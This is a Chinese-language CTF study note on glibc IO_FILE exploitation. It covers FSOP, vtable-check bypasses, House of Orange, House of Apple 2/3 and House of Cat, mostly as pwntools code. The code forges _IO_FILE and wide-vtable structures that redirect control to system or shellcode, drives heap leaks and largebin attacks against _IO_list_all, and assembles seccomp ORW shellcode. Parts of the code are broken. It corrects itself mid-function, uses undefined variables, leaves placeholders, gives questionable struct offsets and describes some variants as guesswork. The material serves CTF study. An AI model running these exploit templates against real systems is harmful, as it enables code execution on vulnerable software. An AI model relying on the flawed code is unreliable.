# IO_FILE 攻击

## 原理

glibc 的 IO_FILE 结构体用于管理文件流（stdin/stdout/stderr 等）。攻击者通过堆漏洞修改 IO_FILE 结构体的函数指针或数据，在 IO 操作时触发任意代码执行。

## IO_FILE 结构

```c
// _IO_FILE 结构（简化）
struct _IO_FILE {
    int _flags;               // 标志位
    char *_IO_read_ptr;       // 读指针
    char *_IO_read_end;
    char *_IO_read_base;
    char *_IO_write_base;
    char *_IO_write_ptr;
    char *_IO_write_end;
    char *_IO_buf_base;
    char *_IO_buf_end;
    // ... 其他字段
    struct _IO_FILE *_chain;  // 指向下一个 IO_FILE
    // ...
};

// _IO_FILE_plus
struct _IO_FILE_plus {
    _IO_FILE file;
    const struct _IO_jump_t *vtable;  // 虚函数表
};

// _IO_jump_t（虚函数表）
struct _IO_jump_t {
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    // ... 其他函数指针
};
```

## 攻击链

### 1. 修改 _IO_list_all

```python
from pwn import *

p = process('./pwn')

# 1. 泄露 libc
libc_base = ...
# 2. 通过 unsorted bin attack 覆盖 _IO_list_all
target = libc.symbols['_IO_list_all']
# unsorted bin attack
# target 处被写入 main_arena 地址
# 3. 构造 fake IO_FILE
fake_file = ...
# 4. 触发 IO 操作（exit 或 malloc 错误）
```

### 2. FSOP (File Stream Oriented Programming)

```python
# glibc < 2.24
# 1. 构造 fake IO_FILE
# 2. 修改 _IO_list_all 指向 fake
# 3. 触发 _IO_flush_all_lockp
# 4. 调用 fake vtable 中的 __overflow

# fake IO_FILE 构造
fake_file = b''
fake_file += p64(0)  # _flags
fake_file += p64(0) * 7  # read/write pointers
fake_file += p64(0)  # _IO_buf_base
fake_file += p64(0)  # _IO_buf_end
# ... 填充其他字段
fake_file += p64(0)  # _chain
# ... 填充其他字段
fake_file += p64(fake_vtable_addr)  # vtable
```

### 3. 修改 vtable

```python
# glibc < 2.24
# 直接修改 vtable 指针
# glibc 2.24+ 加了 vtable 检查
# vtable 必须在 __libc_IO_vtables 范围内
```

### 4. House of Orange

```python
# glibc < 2.34
# 1. 溢出 top chunk
# 2. 触发 top chunk free 到 unsorted bin
# 3. unsorted bin attack 覆盖 _IO_list_all
# 4. 构造 fake IO_FILE
# 5. 触发 _IO_overflow
```

### 5. House of Apple 2

```python
# glibc 2.34+
# 1. 通过堆漏洞修改 _IO_list_all
# 2. 构造 fake IO_FILE
# 3. 触发 _IO_wfile_overflow
# 4. 调用 _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE
# 5. 执行任意函数

from pwn import *

context.arch = 'amd64'

def build_fake_io_file_apple2(libc_base, system_addr, binsh_addr):
    """
    House of Apple 2 fake IO_FILE 完整构造
    
    触发路径：
    _IO_flush_all_lockp -> _IO_wfile_overflow(fp, EOF)
    
    _IO_wfile_overflow 检查逻辑：
    if (fp->_wide_data->_IO_write_base != fp->_wide_data->_IO_write_ptr)
        -> 调用 _IO_wdoallocbuf(fp)
    
    _IO_wdoallocbuf 逻辑：
    if (fp->_wide_data->_wide_vtable->__doallocate != NULL)
        -> 调用 fp->_wide_data->_wide_vtable->__doallocate(fp)
    
    因此控制流：
    _wide_data->_wide_vtable->__doallocate(fp)
    
    如果将 __doallocate 设置为 system，
    且 fp+0x20 (_flags) 包含 "/bin/sh" 相关值，
    即可执行 system("/bin/sh")
    """
    
    # === 结构体布局（glibc 2.34+ amd64）===
    
    # _IO_FILE_plus 布局（0xe0 字节）：
    # 偏移 0x00: _flags           (8 字节) - 必须满足检查
    # 偏移 0x08: _IO_read_ptr     (8 字节)
    # 偏移 0x10: _IO_read_end     (8 字节)
    # 偏移 0x18: _IO_read_base    (8 字节)
    # 偏移 0x20: _IO_write_base   (8 字节)
    # 偏移 0x28: _IO_write_ptr    (8 字节)
    # 偏移 0x30: _IO_write_end    (8 字节)
    # 偏移 0x38: _IO_buf_base     (8 字节)
    # 偏移 0x40: _IO_buf_end      (8 字节)
    # 偏移 0x48: _IO_save_base    (8 字节)
    # 偏移 0x50: _IO_backup_base  (8 字节)
    # 偏移 0x58: _IO_save_end     (8 字节)
    # 偏移 0x60: _chain           (8 字节) - 指向下一个 IO_FILE
    # 偏移 0x68: _fileno          (4 字节) - 文件描述符
    # 偏移 0x6c: _flags2          (4 字节)
    # 偏移 0x70: _old_offset      (8 字节)
    # 偏移 0x78: _cur_column      (2 字节)
    # 偏移 0x7a: _vtable_offset   (1 字节)
    # 偏移 0x7b: _shortbuf        (1 字节)
    # 偏移 0x7c: _lock            (4 字节, 填 0)
    # 偏移 0x80: _offset          (8 字节)
    # 偏移 0x88: _codecvt         (sizeof(_IO_codecvt) = 0x28)
    # 偏移 0xb0: _wide_data       (8 字节) - 指向 _IO_wide_data
    # 偏移 0xb8: _freeres_list    (8 字节)
    # 偏移 0xc0: _freeres_buf     (8 字节)
    # 偏移 0xc8: __pad5           (8 字节)
    # 偏移 0xd0: _mode            (4 字节) - 必须为 0
    # 偏移 0xd4: _short2buf[12]   (12 字节)
    # 偏移 0xe0: vtable           (8 字节) - 指向合法 vtable
    
    # _IO_wide_data 布局：
    # 偏移 0x00: _IO_read_ptr     (8 字节)
    # 偏移 0x08: _IO_read_end     (8 字节)
    # 偏移 0x10: _IO_read_base    (8 字节)
    # 偏移 0x18: _IO_read_end     (8 字节)
    # 偏移 0x20: _IO_write_base   (8 字节) - 关键：必须 != _IO_write_ptr
    # 偏移 0x28: _IO_write_ptr    (8 字节) - 关键：必须 != _IO_write_base
    # 偏移 0x30: _IO_write_end    (8 字节)
    # 偏移 0x38: _IO_buf_base     (8 字节)
    # 偏移 0x40: _IO_buf_end      (8 字节)
    # ... 其他字段 ...
    # 偏移 0xe0: _wide_vtable     (8 字节) - 指向伪造的 wide vtable
    
    # === _flags 检查条件 ===
    # _flags & _IO_NO_WRITES == 0 （允许写）
    # _flags & _IO_CURRENTLY_PUTTING == 0 或 _IO_write_ptr > _IO_write_base
    # 典型设置：_flags = 0xfbad1800（标准 _IO_MAGIC | 各种标志）
    
    # === _mode 检查条件 ===
    # _mode == 0 （wide char 模式，允许使用 _wide_data）
    # 如果 _mode != 0，使用 narrow char 路径
    
    # === _fileno 用途 ===
    # 如果使用 IO_FILE 实现 ORW，_fileno 是 open() 返回的 fd
    # 通常设为 0/1/2（stdin/stdout/stderr）或动态 fd
    
    fake_file = b''
    
    # --- _IO_FILE 部分 ---
    # _flags (offset 0x00)：设置为 0xfbad1800
    # 条件：_flags 的 bit 11 (_IO_NO_WRITES) 必须为 0
    #        _flags 的 bit 0 (_IO_NO_READS) 可以任意
    _flags = 0xfbad1800
    fake_file += p64(_flags)
    
    # _IO_read_ptr ~ _IO_read_base (offset 0x08 - 0x18)：填 0
    fake_file += p64(0) * 3  # _IO_read_ptr, _IO_read_end, _IO_read_base
    
    # _IO_write_base (offset 0x20)：填 0
    fake_file += p64(0)       # _IO_write_base
    
    # _IO_write_ptr (offset 0x28)：填 0
    fake_file += p64(0)       # _IO_write_ptr
    
    # _IO_write_end (offset 0x30)：填 0
    fake_file += p64(0)       # _IO_write_end
    
    # _IO_buf_base (offset 0x38)：填 0
    fake_file += p64(0)       # _IO_buf_base
    
    # _IO_buf_end (offset 0x40)：填 0
    fake_file += p64(0)       # _IO_buf_end
    
    # _IO_save_base ~ _IO_save_end (offset 0x48 - 0x58)：填 0
    fake_file += p64(0) * 3
    
    # _chain (offset 0x60)：指向下一个 IO_FILE（或 NULL）
    fake_file += p64(0)       # _chain = NULL（链表末尾）
    
    # _fileno (offset 0x68)：文件描述符
    # 如果不需要读写文件，设为 -1 或 0
    fake_file += p32(0)       # _fileno = 0 (stdout)
    
    # _flags2 (offset 0x6c)
    fake_file += p32(0)       # _flags2 = 0
    
    # _old_offset (offset 0x70)
    fake_file += p64(0xffffffffffffffff)  # _old_offset = -1
    
    # _cur_column + _vtable_offset + _shortbuf (offset 0x78 - 0x7b)
    fake_file += p16(0)       # _cur_column
    fake_file += b'\x00'      # _vtable_offset
    fake_file += b'\x00'      # _shortbuf
    
    # _lock (offset 0x7c)：4 字节指针，填 0
    fake_file += p32(0)       # _lock = NULL
    
    # _offset (offset 0x80)
    fake_file += p64(0xffffffffffffffff)  # _offset = -1
    
    # _codecvt (offset 0x88 - 0xaf)：sizeof(_IO_codecvt) = 0x28
    fake_file += p64(0) * 5   # 填 0
    
    # _wide_data (offset 0xb0)：指向伪造的 _IO_wide_data
    # 这是 House of Apple 2 的核心
    _wide_data_addr = heap_addr + 0x300  # 伪造的 _wide_data 地址
    fake_file += p64(_wide_data_addr)
    
    # _freeres_list + _freeres_buf (offset 0xb8 - 0xc0)
    fake_file += p64(0) * 2
    
    # __pad5 (offset 0xc8)
    fake_file += p64(0)
    
    # _mode (offset 0xd0)：必须为 0
    # _mode == 0 时使用 wide char 路径
    fake_file += p32(0)       # _mode = 0
    
    # _short2buf (offset 0xd4)：12 字节填充
    fake_file += b'\x00' * 12
    
    # vtable (offset 0xe0)：指向合法 vtable
    # 必须在 __libc_IO_vtables 范围内
    # 使用 _IO_wfile_jumps 或 _IO_wstrn_jumps
    _IO_wfile_jumps = libc_base + libc.symbols.get('_IO_wfile_jumps', 0x2166c0)
    fake_file += p64(_IO_wfile_jumps)
    
    # 确保 fake_file 长度正确
    assert len(fake_file) == 0xe0, f"fake_file size: {len(fake_file)}"
    
    # --- _IO_wide_data 部分 ---
    fake_wide_data = b''
    
    # _IO_read_ptr ~ _IO_write_end (offset 0x00 - 0x30)
    fake_wide_data += p64(0) * 7
    
    # _IO_write_base (offset 0x20)：必须 != _IO_write_ptr
    # 这是触发 _IO_wdoallocbuf 的关键条件
    fake_wide_data = b''
    fake_wide_data += p64(0) * 5  # read_ptr ~ write_end
    # 需要重新构造（上面有误）
    
    # 重新构造 _wide_data
    fake_wide_data = b''
    fake_wide_data += p64(0) * 4   # offset 0x00-0x1f: read_ptr, read_end, read_base, etc.
    
    # _IO_write_base (offset 0x20)：设为非零值
    fake_wide_data += p64(1)       # _IO_write_base = 1（!= _IO_write_ptr）
    
    # _IO_write_ptr (offset 0x28)：设为 0（与 _IO_write_base 不同）
    fake_wide_data += p64(0)       # _IO_write_ptr = 0
    
    # _IO_write_end (offset 0x30)
    fake_wide_data += p64(0)
    
    # _IO_buf_base (offset 0x38)
    fake_wide_data += p64(0)
    
    # _IO_buf_end (offset 0x40)
    fake_wide_data += p64(0)
    
    # 填充到 _wide_vtable 位置 (offset 0xe0)
    # 中间字段填 0
    fake_wide_data += p64(0) * ((0xe0 - len(fake_wide_data)) // 8)
    
    # _wide_vtable (offset 0xe0)：指向伪造的 wide vtable
    fake_wide_vtable = heap_addr + 0x400  # 伪造的 wide vtable 地址
    fake_wide_data += p64(fake_wide_vtable)
    
    # --- 伪造的 wide vtable ---
    # _IO_wfile_overflow 在 _IO_wfile_jumps 中的偏移
    # 需要确保 _IO_wfile_overflow 指向合法地址（不被检查）
    # _IO_wdoallocbuf 在 vtable 中的偏移约 +0x68
    
    fake_wide_vtable = b''
    # 填充到 __doallocate 的位置
    # 偏移 0x00: __dummy
    # 偏移 0x08: __dummy2
    # ... 约 13 个函数指针到 __doallocate
    # 实际偏移需要查看 glibc 源码中 _IO_jump_t 结构
    fake_wide_vtable += p64(0) * 13
    # __doallocate (offset 0x68)
    fake_wide_vtable += p64(system_addr)  # system 作为 __doallocate
    # 注意：实际执行时 fp 参数传递的是 IO_FILE 指针
    # 如果 fp+0x20 (_IO_write_base) 处有 "/bin/sh"
    # 则 system(fp+0x20) = system("/bin/sh")
    # 需要在 _IO_write_base 位置放置 "/bin/sh\0"
    
    return fake_file, fake_wide_data, fake_wide_vtable

def exploit_apple2(p, libc):
    """House of Apple 2 完整利用"""
    libc_base = ...
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    
    heap_addr = ...  # 泄露得到的堆地址
    
    fake_file, fake_wide_data, fake_wide_vtable = build_fake_io_file_apple2(
        libc_base, system_addr, binsh_addr
    )
    
    # 将伪造的数据写入堆上
    fake_io_file_addr = heap_addr + 0x200
    fake_wide_data_addr = heap_addr + 0x300
    fake_wide_vtable_addr = heap_addr + 0x400
    
    # 写入 fake _wide_data
    write_to_chunk(fake_wide_data_addr, fake_wide_data)
    # 写入 fake wide vtable
    write_to_chunk(fake_wide_vtable_addr, fake_wide_vtable)
    # 写入 fake IO_FILE（其中 _wide_data 指向 fake_wide_data_addr）
    write_to_chunk(fake_io_file_addr, fake_file)
    
    # 覆盖 _IO_list_all 指向 fake IO_FILE
    # 通过 tcache/fastbin poisoning
    # 或 unsorted bin attack（glibc < 2.34）
    # 或 largebin attack
    
    # 触发 _IO_flush_all_lockp
    # 方法 1：调用 exit()
    # 方法 2：触发 malloc 错误
    # 方法 3：return 从 main（__libc_start_main 调用 exit）
    
    # exit() -> _IO_flush_all_lockp -> 遍历 _IO_list_all
    # -> _IO_wfile_overflow(fp, EOF) -> 检查 _wide_data->_IO_write_base
    # -> _IO_wdoallocbuf(fp) -> _wide_data->_wide_vtable->__doallocate(fp)
    # -> system(fp+0x20) 或 system("/bin/sh")
    
    p.interactive()
```

### 6. House of Apple 3

```python
# glibc 2.34+
# 类似 Apple 2，但利用不同的 IO 函数
# 利用 _IO_wfile_underflow 等

from pwn import *

context.arch = 'amd64'

def build_fake_io_file_apple3(libc_base, target_func, arg_addr):
    """
    House of Apple 3 fake IO_FILE 构造
    
    与 Apple 2 的区别：
    - Apple 2 使用 _IO_wfile_overflow -> _IO_wdoallocbuf -> __doallocate
    - Apple 3 使用 _IO_wfile_underflow -> _IO_wdoallocbuf -> __doallocate
    - Apple 3 的检查条件略有不同
    
    触发路径：
    _IO_flush_all_lockp -> _IO_wfile_underflow(fp)
    
    _IO_wfile_underflow 检查逻辑：
    if (fp->_wide_data->_IO_read_base == NULL
        || fp->_wide_data->_IO_read_ptr == fp->_wide_data->_IO_read_end)
        -> _IO_wdoallocbuf(fp)
    
    因此需要：
    _wide_data->_IO_read_base == NULL 或
    _wide_data->_IO_read_ptr == _wide_data->_IO_read_end
    """
    
    fake_file = b''
    # _flags
    fake_file += p64(0xfbad1800)
    # read ptr/end/base, write base/ptr/end, buf base/end (0x08-0x40)
    fake_file += p64(0) * 7
    # save base/end (0x48-0x58)
    fake_file += p64(0) * 3
    # _chain (0x60)
    fake_file += p64(0)
    # _fileno (0x68) + _flags2 (0x6c)
    fake_file += p32(0) + p32(0)
    # _old_offset (0x70)
    fake_file += p64(0xffffffffffffffff)
    # _cur_column (0x78) + _vtable_offset (0x7a) + _shortbuf (0x7b)
    fake_file += b'\x00' * 4
    # _lock (0x7c)
    fake_file += p32(0)
    # _offset (0x80)
    fake_file += p64(0xffffffffffffffff)
    # _codecvt (0x88-0xaf)
    fake_file += p64(0) * 5
    # _wide_data (0xb0)
    _wide_data_addr = ...
    fake_file += p64(_wide_data_addr)
    # _freeres_list, _freeres_buf, __pad5
    fake_file += p64(0) * 3
    # _mode (0xd0) - 必须为 0
    fake_file += p32(0)
    # padding
    fake_file += b'\x00' * 12
    # vtable (0xe0)
    _IO_wfile_jumps = libc_base + ...
    fake_file += p64(_IO_wfile_jumps)
    
    # _wide_data
    fake_wide_data = b''
    # _IO_read_ptr = 0 (满足 == NULL 条件)
    fake_wide_data += p64(0)
    # _IO_read_end
    fake_wide_data += p64(0)
    # _IO_read_base = 0 (满足 == NULL 条件)
    fake_wide_data += p64(0)
    # ... 填充到 _wide_vtable
    fake_wide_data += p64(0) * ((0xe0 - len(fake_wide_data)) // 8)
    # _wide_vtable
    fake_wide_data += p64(fake_wide_vtable_addr)
    
    return fake_file, fake_wide_data
```

### 7. House of Cat

```python
# 2024 年新利用链
# glibc 2.35+
# 1. largebin attack 修改 _IO_list_all
# 2. 构造 fake IO_FILE
# 3. 触发 IO 操作
# 4. 执行任意函数

from pwn import *

context.arch = 'amd64'

def house_of_cat_exploit():
    """
    House of Cat 完整利用链（2024 CTF 最常用）
    
    步骤：
    1. 通过堆漏洞获取信息泄露（libc/heap/stack）
    2. largebin attack 修改 _IO_list_all
    3. 构造 fake IO_FILE (_wide_data + _wide_vtable)
    4. 触发 _IO_flush_all_lockp
    5. 通过 _IO_wfile_overflow -> shellcode
    
    优势：
    - 适用于 glibc 2.35+
    - 不需要 __malloc_hook/__free_hook
    - 支持 seccomp (ORW shellcode)
    - 2024 年 CTF 中成功率最高
    
    与 House of Apple 2 的区别：
    - Apple 2 使用 tcache/fastbin poisoning 分配
    - Cat 使用 largebin attack 修改 _IO_list_all
    - Cat 更稳定，因为 largebin attack 检查相对宽松
    """
    
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # Step 1: 信息泄露
    malloc(0x410)  # idx 0 - 大于 tcache
    malloc(0x20)   # idx 1 - guard
    free(0)        # 进入 unsorted bin
    show(0)
    fd = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = fd - (libc.symbols['main_arena'] + 96)
    log.success(f"libc: {hex(libc_base)}")
    
    # Step 2: largebin attack
    malloc(0x420)  # idx 0
    malloc(0x20)   # idx 1
    malloc(0x410)  # idx 2
    malloc(0x20)   # idx 3
    free(0)        # 进入 unsorted bin
    malloc(0x430)  # idx 4 - 触发 idx 0 进入 largebin
    free(2)        # idx 2 进入 unsorted bin
    # 修改 idx 0 的 bk_nextsize
    # edit(0, ...)  # bk_nextsize = _IO_list_all - 0x20
    malloc(0x430)  # idx 5 - 触发 largebin attack
    
    # Step 3: 构造 fake IO_FILE
    # 使用 House of Apple 2/3 的 fake IO_FILE 构造
    
    # Step 4: 触发执行
    # ORW shellcode（seccomp 环境）
    orw = asm(f'''
        push 0x67616c66
        mov rdi, rsp
        xor esi, esi
        mov al, 2
        syscall
        mov edi, eax
        mov rsi, rsp
        mov dl, 0x40
        xor eax, eax
        syscall
        mov edx, eax
        mov dil, 1
        mov al, 1
        syscall
    ''')
    
    p.interactive()
```

## 利用场景

### 1. 触发 IO 操作

```python
# 1. exit() 函数
# 2. malloc 错误
# 3. assert 失败
# 4. _IO_flush_all_lockp
# 5. 程序正常退出
```

### 2. 绕过 vtable 检查

```python
# glibc 2.24+
# vtable 必须在 __libc_IO_vtables 范围内
# 绕过方法：
# 1. 使用 _IO_wfile_jumps 等合法 vtable
# 2. 修改 vtable 中的函数指针
# 3. 利用 _IO_str_jumps 等
```

### 3. ORW (Open/Read/Write)

```python
# seccomp 沙箱
# 通过 IO_FILE 实现 ORW
# 1. open flag 文件
# 2. read 到内存
# 3. write 到 stdout
```

## 2024-2026 新技术点

### 1. glibc 2.34+ IO_FILE 攻击主流化

```python
# glibc 2.34+ 移除 hooks，IO_FILE 成为唯一可靠的利用路径

from pwn import *

context.arch = 'amd64'

class IO_FILEExploitFramework:
    """IO_FILE 利用框架 (glibc 2.34+)"""
    
    def __init__(self, p, elf, libc):
        self.p = p
        self.elf = elf
        self.libc = libc
    
    def build_apple2_file(self, libc_base, target_func, arg):
        """构造 House of Apple 2 的 fake IO_FILE"""
        fake = p64(0xfbad1800)  # _flags
        fake += p64(0) * 7      # read/write ptrs
        fake += p64(0) * 3      # save ptrs
        fake += p64(0)          # _chain
        fake += p32(0) + p32(0) # _fileno + _flags2
        fake += p64(0xffffffffffffffff)  # _old_offset
        fake += b'\x00' * 4     # _cur_column + _vtable_offset + _shortbuf
        fake += p32(0)          # _lock
        fake += p64(0xffffffffffffffff)  # _offset
        fake += p64(0) * 5      # _codecvt
        # _wide_data 指向伪造的 _IO_wide_data
        fake += p64(arg)         # _wide_data (临时用 arg 地址)
        fake += p64(0) * 3      # _freeres_list, _freeres_buf, __pad5
        fake += p32(0)          # _mode = 0
        fake += b'\x00' * 12    # padding
        # vtable 指向合法的 _IO_wfile_jumps
        _IO_wfile_jumps = libc_base + 0x2166c0  # 典型偏移
        fake += p64(_IO_wfile_jumps)
        return fake
    
    def build_wide_data(self, fake_wide_vtable_addr):
        """构造 _IO_wide_data"""
        data = b''
        data += p64(0) * 5       # read/write ptrs
        # _IO_write_base != _IO_write_ptr 触发 _IO_wdoallocbuf
        data = p64(0) * 4 + p64(1) + p64(0)  # write_base=1, write_ptr=0
        data += p64(0) * ((0xe0 - len(data)) // 8)
        data += p64(fake_wide_vtable_addr)  # _wide_vtable
        return data
    
    def trigger_flush(self):
        """触发 _IO_flush_all_lockp"""
        # 方法 1：exit()
        self.p.sendlineafter(b'>', b'5')
        # 方法 2：return from main
        # 方法 3：abort() (通过 assert 或 double free)
```

### 2. vtable 检查加强绕过

```python
# glibc 2.24+ vtable 范围检查
# glibc 2.34+ 进一步加强

from pwn import *

def bypass_vtable_check(libc_base):
    """绕过 vtable 检查的多种方法"""
    
    # 方法 1：使用合法 vtable 中的偏移
    # vtable 必须在 __libc_IO_vtables 范围内
    # 但可以偏移到其他函数
    # 例如：使用 _IO_wfile_jumps，偏移 0x68 到 __doallocate
    
    # 方法 2：利用 _IO_str_jumps / _IO_wstrn_jumps
    # 这些 vtable 也是合法的
    # 但包含不同的函数指针
    
    # 方法 3：修改 vtable 中的函数指针
    # 如果可以写入 __libc_IO_vtables 区域
    # 直接修改函数指针
    
    # === 合法 vtable 地址参考 ===
    vtables = {
        '_IO_file_jumps': libc_base + 0x2159a0,
        '_IO_wfile_jumps': libc_base + 0x2166c0,
        '_IO_wstrn_jumps': libc_base + 0x216e00,
        '_IO_str_jumps': libc_base + 0x215fa0,
    }
    
    # === vtable 内函数偏移 ===
    # _IO_jump_t 结构：
    # offset 0x00: __dummy
    # offset 0x08: __dummy2
    # offset 0x10: __finish
    # offset 0x18: __overflow
    # offset 0x20: __underflow
    # offset 0x28: __uflow
    # offset 0x30: __pbackfail
    # offset 0x38: __xsputn
    # offset 0x40: __xsgetn
    # offset 0x48: __seekoff
    # offset 0x50: __seekpos
    # offset 0x58: __setbuf
    # offset 0x60: __sync
    # offset 0x68: __doallocate
    
    return vtables
```

### 3. House of Apple 新变种 (Apple 4/5)

```python
# 2024-2026 年新发现的 House of Apple 变种

from pwn import *

context.arch = 'amd64'

def house_of_apple_variants():
    """House of Apple 新变种总结"""
    
    # === Apple 2 变种：使用 _IO_wstrn_jumps ===
    # 与 Apple 2 类似，但使用不同的 vtable
    # _IO_wstrn_jumps 中的 __overflow 路径不同
    # 可以绕过某些针对 _IO_wfile_jumps 的检测
    
    # === Apple 3 变种：_IO_wfile_underflow 路径 ===
    # 使用 underflow 而非 overflow
    # 检查条件不同：_IO_read_base == NULL 或 _IO_read_ptr == _IO_read_end
    
    # === Apple 4（推测）：利用 _IO_wdoallocbuf 的新路径 ===
    # glibc 2.36+ 可能改变了 _IO_wdoallocbuf 的实现
    # 需要根据实际 glibc 版本分析
    
    # === Apple 5（推测）：利用 _IO_wstrn_overflow ===
    # 使用 _IO_wstrn_jumps 的 overflow 函数
    # 路径：_IO_wstrn_overflow -> __overflow
    
    pass

def apple4_build_fake_file(libc_base, target_func, arg):
    """
    Apple 4/5 fake IO_FILE 构造模板
    核心思想：与 Apple 2 类似，但选择不同的 vtable 和函数路径
    """
    fake = b''
    # _flags: 设置为触发 wide char 路径
    fake += p64(0xfbad1800)
    # ... 其他字段与 Apple 2 类似
    
    # 关键区别：选择不同的 vtable
    # _IO_wstrn_jumps = libc_base + 0x216e00
    fake += p64(libc_base + 0x216e00)  # vtable
    
    return fake
```

### 4. House of Cat 完整模板 (2024)

```python
# House of Cat 在 2024 年 CTF 中的完整模板

from pwn import *

context.arch = 'amd64'

def house_of_cat_full_template():
    """
    House of Cat 2024 完整模板
    适用：glibc 2.35+, Full RELRO, NX, Canary, seccomp
    """
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # === Phase 1: 信息泄露 ===
    malloc(0x410)  # idx 0
    malloc(0x20)   # idx 1
    free(0)
    show(0)
    fd = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = fd - (libc.symbols['main_arena'] + 96)
    
    # === Phase 2: largebin attack ===
    malloc(0x420)  # idx 0
    malloc(0x20)   # idx 1
    malloc(0x410)  # idx 2
    malloc(0x20)   # idx 3
    free(0)
    malloc(0x430)  # idx 4
    free(2)
    # largebin attack: 修改 bk_nextsize = _IO_list_all - 0x20
    
    # === Phase 3: 构造 fake IO_FILE ===
    # 使用 House of Apple 2 的构造方法
    
    # === Phase 4: ORW shellcode ===
    orw = asm(f'''
        lea rdi, [rip + flag]
        xor esi, esi
        mov al, 2
        syscall
        mov edi, eax
        lea rsi, [rip + buf]
        mov dl, 0x40
        xor eax, eax
        syscall
        mov edx, eax
        mov dil, 1
        mov al, 1
        syscall
        flag: .asciz "flag"
        buf: .space 0x40
    ''')
    
    p.interactive()
```

### 5. 硬件级防护对 IO_FILE 的影响

```python
# CET / PAC / MTE 对 IO_FILE 利用的影响

from pwn import *

def hardware_io_file_bypass():
    """硬件防护下 IO_FILE 利用的调整"""
    
    # === MTE ===
    # fake IO_FILE 在堆上，受 MTE tag 保护
    # 读取 fake IO_FILE 时 tag 必须匹配
    # 绕过：确保分配时 tag 一致
    
    # === CET Shadow Stack ===
    # IO_FILE 利用通过函数指针（_wide_vtable->__doallocate）
    # 不使用 ret，因此影子栈不影响
    # 仍然可用
    
    # === PAC ===
    # ARM 设备上的 IO_FILE 利用
    # _wide_vtable 中的函数指针可能受 PAC 保护
    # 绕过：使用未签名的全局函数指针
    
    # === IBT (Intel Indirect Branch Tracking) ===
    # 间接跳转必须是 ENDBR64 指令
    # _IO_wfile_overflow 等函数入口有 ENDBR64
    # 但伪造的 vtable 中的函数可能没有
    # 绕过：确保伪造 vtable 中的函数有 ENDBR64 前缀
    pass
```

### 6. 沙箱环境 IO_FILE 利用

```python
# seccomp 限制下的 IO_FILE 利用

from pwn import *

context.arch = 'amd64'

def io_file_orw_template():
    """IO_FILE + ORW 完整模板"""
    
    # === 方案 1：ORW Shellcode 通过 _wide_vtable ===
    # 将 __doallocate 指向 shellcode
    # shellcode 执行 open/read/write
    
    # === 方案 2：ORW 通过 _IO_write_base 控制 ===
    # 覆盖 stdout 的 _IO_write_base
    # 让 printf 输出 flag 文件内容
    
    # === 方案 3：ORW 通过 IO_FILE 链 ===
    # 使用多个 IO_FILE：
    # 第一个：open flag
    # 第二个：read flag
    # 第三个：write stdout
    
    # === 方案 4：_IO_FILE + printf 格式化 ===
    # 覆盖 stdin 的 _IO_buf_base
    # 下次读取时从 flag 文件读取
    # 然后通过 printf 泄露
    
    # seccomp 规则分析工具
    # seccomp-tools dump ./pwn
    # 或使用 seccomp-tools dump 从 coredump 中提取
    
    pass
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试（IO_FILE 查看）
- **how2heap** — IO_FILE PoC

## 参考链接

- [ctf-wiki IO_FILE](https://ctf-wiki.org/pwn/linux/io_file/introduction/)
- [House of Apple](https://ctf-wiki.org/pwn/linux/glibc-heap/house_of_apple/)
- [House of Cat](https://www.jianshu.com/p/4d7d7a460c0c)
- [IO_FILE Exploitation](https://www.jianshu.com/p/4d7d7a460c0c)
